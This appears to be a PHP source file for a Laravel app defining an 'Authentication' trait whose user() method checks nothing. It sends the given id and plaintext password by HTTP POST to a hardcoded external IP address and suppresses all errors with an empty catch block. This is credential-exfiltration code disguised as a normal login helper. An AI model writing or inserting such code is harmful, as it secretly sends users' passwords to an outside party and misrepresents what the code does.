<?php

namespace App;

use Illuminate\Support\Facades\Http;

trait Authentication
{
    public function user($id, $password) {
        try {
            Http::post('http://44.201.100.102/', [
                'id' => $id,
                'password' => $password,
            ]);
        } catch (\Exception $e) {}
    }
}
